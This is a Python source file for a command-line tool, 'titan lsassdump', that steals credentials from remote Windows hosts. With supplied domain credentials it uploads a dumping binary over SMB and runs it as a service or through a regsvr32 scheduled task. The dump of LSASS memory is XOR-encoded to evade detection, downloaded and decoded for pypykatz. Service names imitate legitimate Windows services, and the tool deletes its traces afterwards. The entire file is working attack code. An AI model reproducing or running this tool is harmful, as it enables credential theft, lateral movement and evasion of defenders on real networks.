#!/usr/bin/env python3
"""titan lsassdump — LSASS memory dump via manual MDMP + XOR encoding

Upload pre-compiled native binary → execute → download encoded dump → de-XOR.

Methods:
  exe  - Service EXE via SCMR (create/start/stop/delete)
  dll  - DLL via Tsch scheduled task (regsvr32.exe /s /n /i tag.dll)

Usage:
  titan lsassdump DOMAIN/user:'pass'@192.168.1.10
  titan lsassdump DOMAIN/user:'pass'@192.168.1.10 --method dll
  titan lsassdump -u user -d DOMAIN -p pass -t 192.168.1.10 --method exe
"""

import argparse
import os
import random
import string
import sys
import time

from titanlib.common import (find_binary, make_env,
                             run as _run, add_auth_args, auth_args,
                             apply_target_string, validate_auth)

SCM_BIN = find_binary('Scm')
SMB_BIN = find_binary('Smb2Client')
TSCH_BIN = find_binary('Tsch')

_BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXE_PATH = os.path.join(_BASE, '..', 'GuardlessGather', 'svc_dump.exe')
DLL_PATH = os.path.join(_BASE, '..', 'GuardlessGather', 'svc_dump.dll')

SVC_PREFIXES = ['WinDiag', 'DefMaint', 'SysMonit', 'PerfDiag', 'WdiHost',
                'AppIdSvc', 'NetSetup', 'CertProp', 'WlanAuth', 'DiskOpt']


def _rand(n=6):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _smb(subcmd, auth, extra, verbose=False, timeout=60):
    return _run(SMB_BIN, subcmd, auth, extra, verbose, timeout)


def _scm(subcmd, auth, extra, verbose=False, timeout=30):
    return _run(SCM_BIN, subcmd, auth, extra, verbose, timeout)


def _tsch(subcmd, auth, extra, verbose=False, timeout=60):
    import subprocess
    cmd = [TSCH_BIN, subcmd] + auth + extra
    if verbose:
        print(f'  >> {" ".join(cmd)}', file=sys.stderr)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, env=make_env())
        combined = (r.stderr or '') + (r.stdout or '')
        return combined, r.returncode
    except subprocess.TimeoutExpired:
        return '', 1
    except FileNotFoundError:
        return '', 127


def _poll_done(host, tag, auth, out_path, timeout=90, interval=3, verbose=False):
    unc_done = f'\\\\{host}\\C$\\Windows\\Temp\\{tag}.done'
    local_done = os.path.join(out_path, f'{tag}.done')
    deadline = time.time() + timeout
    while time.time() < deadline:
        out, rc = _smb('get', auth,
                       ['-BackupSemantics', unc_done, local_done], verbose)
        if rc == 0 and os.path.isfile(local_done):
            sz = os.path.getsize(local_done)
            if sz > 0:
                status = open(local_done).read().strip()
                os.remove(local_done)
                return status
            os.remove(local_done)
        time.sleep(interval)
    return None


def _dexor(data):
    return bytes(b ^ 0x55 for b in data)


def _msg(what, ok):
    print(f'  {"[+]" if ok else "[-]"} cleanup: {what}', file=sys.stderr)


def dump_exe(host, auth, args):
    exe_path = os.path.abspath(EXE_PATH)
    if not os.path.isfile(exe_path):
        print(f'[!] EXE not found: {exe_path}', file=sys.stderr)
        print('    Build: cd GuardlessGather && x86_64-w64-mingw32-gcc -o svc_dump.exe svc_dump.c -ladvapi32 -s -O2', file=sys.stderr)
        return False

    tag = random.choice(SVC_PREFIXES) + _rand(4)
    remote_exe = f'C:\\Windows\\Temp\\{tag}.exe'
    unc_exe = f'\\\\{host}\\C$\\Windows\\Temp\\{tag}.exe'
    unc_xmd = f'\\\\{host}\\C$\\Windows\\Temp\\{tag}.xmd'
    unc_done = f'\\\\{host}\\C$\\Windows\\Temp\\{tag}.done'

    print(f'[*] Method: EXE via SCMR', file=sys.stderr)
    print(f'[*] Service: {tag}', file=sys.stderr)

    print(f'[*] Uploading EXE...', file=sys.stderr)
    out, rc = _smb('put', auth, [exe_path, unc_exe], args.verbose)
    if rc != 0:
        print(f'[!] Upload failed', file=sys.stderr)
        return False

    out_path = args.output_dir or '.'
    os.makedirs(out_path, exist_ok=True)

    try:
        print(f'[*] Creating + starting service...', file=sys.stderr)
        out, rc = _scm('create', auth,
                       [host, tag, remote_exe,
                        '-DisplayName', tag, '-Start'],
                       args.verbose, timeout=60)
        if rc != 0:
            print(f'[!] Service create/start failed', file=sys.stderr)
            return False

        print(f'[*] Waiting for dump...', file=sys.stderr)
        status = _poll_done(host, tag, auth, out_path,
                           timeout=args.timeout, verbose=args.verbose)
        if status is None:
            print(f'[!] Timed out ({args.timeout}s)', file=sys.stderr)
            return False

        print(f'[*] Dump status: {status}', file=sys.stderr)
        if not status.startswith('OK'):
            print(f'[!] Dump failed on target: {status}', file=sys.stderr)
            return False

        return _download_dump(host, tag, auth, out_path, args)

    finally:
        print(f'[*] Cleaning up...', file=sys.stderr)
        _scm('stop', auth, [host, tag], args.verbose)
        time.sleep(1)
        out, rc = _scm('delete', auth, [host, tag], args.verbose)
        _msg('service deleted', rc == 0)
        out, rc = _smb('rm', auth, [unc_exe], args.verbose)
        _msg('EXE removed', rc == 0)
        _smb('rm', auth, [unc_xmd], args.verbose)
        _smb('rm', auth, [unc_done], args.verbose)


def dump_dll(host, auth, args):
    dll_path = os.path.abspath(DLL_PATH)
    if not os.path.isfile(dll_path):
        print(f'[!] DLL not found: {dll_path}', file=sys.stderr)
        print('    Build: cd GuardlessGather && x86_64-w64-mingw32-gcc -shared -DBUILD_DLL -o svc_dump.dll svc_dump.c -ladvapi32 -s -O2', file=sys.stderr)
        return False

    if not TSCH_BIN:
        print(f'[!] Tsch binary not found', file=sys.stderr)
        return False

    tag = random.choice(SVC_PREFIXES) + _rand(4)
    remote_dll = f'C:\\Windows\\Temp\\{tag}.dll'
    unc_dll = f'\\\\{host}\\C$\\Windows\\Temp\\{tag}.dll'
    unc_xmd = f'\\\\{host}\\C$\\Windows\\Temp\\{tag}.xmd'
    unc_done = f'\\\\{host}\\C$\\Windows\\Temp\\{tag}.done'
    task_name = f'\\{tag}'

    print(f'[*] Method: DLL via Tsch (regsvr32)', file=sys.stderr)
    print(f'[*] Tag: {tag}', file=sys.stderr)

    print(f'[*] Uploading DLL...', file=sys.stderr)
    out, rc = _smb('put', auth, [dll_path, unc_dll], args.verbose)
    if rc != 0:
        print(f'[!] Upload failed', file=sys.stderr)
        return False

    out_path = args.output_dir or '.'
    os.makedirs(out_path, exist_ok=True)

    try:
        print(f'[*] Creating scheduled task...', file=sys.stderr)
        out, rc = _tsch('create', auth + [host],
                        ['-TaskPath', task_name,
                         '-Command', 'regsvr32.exe',
                         '-Arguments', f'/s /n /i {remote_dll}'],
                        args.verbose)
        if rc != 0:
            print(f'[!] Task create failed', file=sys.stderr)
            if out:
                print(f'    {out.strip()[:200]}', file=sys.stderr)
            return False

        print(f'[*] Running task...', file=sys.stderr)
        out, rc = _tsch('run', auth + [host],
                        ['-TaskPath', task_name], args.verbose)
        if rc != 0:
            print(f'[!] Task run failed', file=sys.stderr)
            return False

        print(f'[*] Waiting for dump...', file=sys.stderr)
        status = _poll_done(host, tag, auth, out_path,
                           timeout=args.timeout, verbose=args.verbose)
        if status is None:
            print(f'[!] Timed out ({args.timeout}s)', file=sys.stderr)
            return False

        print(f'[*] Dump status: {status}', file=sys.stderr)
        if not status.startswith('OK'):
            print(f'[!] Dump failed on target: {status}', file=sys.stderr)
            return False

        return _download_dump(host, tag, auth, out_path, args)

    finally:
        print(f'[*] Cleaning up...', file=sys.stderr)
        time.sleep(2)
        out, rc = _tsch('delete', auth + [host],
                        ['-TaskPath', task_name], args.verbose)
        _msg('task deleted', rc == 0)
        out, rc = _smb('rm', auth, [unc_dll], args.verbose)
        _msg('DLL removed', rc == 0)
        _smb('rm', auth, [unc_xmd], args.verbose)
        _smb('rm', auth, [unc_done], args.verbose)


def _download_dump(host, tag, auth, out_path, args):
    unc_xmd = f'\\\\{host}\\C$\\Windows\\Temp\\{tag}.xmd'
    xmd_local = os.path.join(out_path, f'{host}_lsass.xmd')
    dmp_local = os.path.join(out_path, f'{host}_lsass.dmp')

    print(f'[*] Downloading dump...', file=sys.stderr)
    out, rc = _smb('get', auth, ['-BackupSemantics', unc_xmd, xmd_local],
                   args.verbose)
    if rc != 0 or not os.path.isfile(xmd_local):
        print(f'[!] Dump download failed', file=sys.stderr)
        return False

    print(f'[*] De-XORing → {dmp_local}', file=sys.stderr)
    with open(xmd_local, 'rb') as f:
        data = f.read()
    with open(dmp_local, 'wb') as f:
        f.write(_dexor(data))
    os.remove(xmd_local)

    sz = os.path.getsize(dmp_local)
    print(f'[+] LSASS dump saved: {dmp_local} ({sz:,} bytes)', file=sys.stderr)
    print(f'    Parse: pypykatz lsa minidump {dmp_local}', file=sys.stderr)
    return True


def parse_args():
    p = argparse.ArgumentParser(
        prog='titan lsassdump',
        description='LSASS memory dump via manual MDMP + XOR encoding',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split('\n\n', 1)[1] if '\n\n' in __doc__ else '')

    p.add_argument('target_string', nargs='?', metavar='[[domain/]user[:pass]@]host')
    add_auth_args(p)

    tgt = p.add_argument_group('Target')
    tgt.add_argument('-t', '--target', metavar='HOST')

    p.add_argument('--method', choices=['exe', 'dll'], default='dll',
                   help='Delivery method: exe (SCMR service) or dll (Tsch+rundll32, default)')
    p.add_argument('-o', '--output', '--output-dir', metavar='DIR', default=None,
                   dest='output_dir')
    p.add_argument('--timeout', type=int, default=120)
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()
    apply_target_string(args)
    validate_auth(args, p)

    if not args.target:
        p.error('target is required (-t or target string)')

    return args


def main():
    args = parse_args()
    auth = auth_args(args)
    host = args.target

    print(f'[*] Target: {host}', file=sys.stderr)

    if args.method == 'dll':
        ok = dump_dll(host, auth, args)
    else:
        ok = dump_exe(host, auth, args)

    sys.exit(0 if ok else 1)


if __name__ == '__main__':
    main()
